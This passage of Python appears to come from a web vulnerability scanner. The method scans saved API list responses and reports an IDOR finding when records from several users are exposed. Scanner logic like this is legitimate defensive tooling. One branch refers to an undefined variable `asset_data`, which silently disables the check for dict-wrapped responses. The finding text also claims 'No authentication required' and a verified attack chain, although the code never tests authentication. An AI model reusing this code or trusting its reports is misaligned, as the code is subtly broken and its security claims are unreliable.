        findings: list[Finding] = []
        
        # Check baselines for endpoints returning arrays
        for endpoint, baseline in self._baselines.items():
            if baseline.status_code != 200:
                continue
            
            try:
                data = baseline.json()
                
                # Handle both direct arrays and {data: []} patterns
                items = None
                if isinstance(data, list) and len(data) > 1:
                    items = data
                elif isinstance(asset_data, dict):
                    # Common patterns: data, items, results, records
                    for key in ['data', 'items', 'results', 'records', 'users', 'feedbacks']:
                        if key in data and isinstance(data[key], list) and len(data[key]) > 1:
                            items = data[key]
                            break
                
                if not items or len(items) < 2:
                    continue
                
                # Check if items contain user-identifying fields
                first_item = items[0]
                if not isinstance(first_item, dict):
                    continue
                
                item_keys = [k.lower() for k in first_item.keys()]
                
                # Look for user-identifying fields
                found_user_fields = []
                for field in ResponseAnalyzer.ARRAY_IDOR_FIELDS:
                    if field in item_keys:
                        found_user_fields.append(field)
                
                # Also check for partial email patterns in values
                item_str = json.dumps(first_item).lower()
                has_email_pattern = bool(re.search(r'\*\*\*.*@|@.*\.\w{2,}', item_str))
                
                if found_user_fields or has_email_pattern:
                    # Count unique user identifiers
                    user_ids = set()
                    for item in items:
                        if isinstance(item, dict):
                            # Create case-insensitive key mapping
                            key_map = {k.lower(): k for k in item.keys()}
                            for field in found_user_fields:
                                real_key = key_map.get(field)
                                if real_key:
                                    val = item.get(real_key)
                                    if val:
                                        user_ids.add(str(val))
                    
                    # Multiple different users = IDOR confirmed
                    if len(user_ids) > 1:
                        exposed_fields = list(set(found_user_fields + (['email'] if has_email_pattern else [])))
                        
                        findings.append(Finding(
                            vuln_type=VulnType.LOGIC_FLAW,
                            name="List IDOR Chain: Unauthenticated Access → Multiple Users' Data",
                            severity=Severity.HIGH,
                            confidence_score=90,
                            description=f"""**HIGH: Insecure Direct Object Reference in List Endpoint**

**Attack Chain Verified:**
1. Access list endpoint: `{endpoint}`
2. No authentication required
3. Response contains data from multiple users
4. User identifiers exposed in array items

**Endpoint:** `{endpoint}`
**Records Exposed:** {len(items)} items
**Unique Users:** {len(user_ids)} different users
**User-Identifying Fields:** {', '.join(exposed_fields)}

**OWASP:** A01:2021-Broken Access Control

**Impact:** Unauthenticated access to multiple users' data.
This exposes user identifiers and associated information.""",
                            host=base_url,
                            endpoint=urljoin(base_url, endpoint),
                            evidence=[
                                f"Endpoint: {endpoint}",
                                f"Items in array: {len(items)}",
                                f"Unique user IDs: {len(user_ids)}",
                                f"User fields: {exposed_fields}",
                                f"Sample IDs: {list(user_ids)[:5]}",
                            ],
                            cvss_score=7.5,
                            cwe_id="CWE-639",
                            remediation="""1. Require authentication for list endpoints
2. Filter data to only show current user's records
3. Implement row-level security
4. Remove user identifiers from public responses
5. Use aggregate data instead of individual records""",
                        ).to_dict())
                        
                        logger.warning(f"🟠 List IDOR VERIFIED at {endpoint}")
                        
            except Exception as e:
                logger.debug(f"List IDOR check error: {e}")
        
        return findings
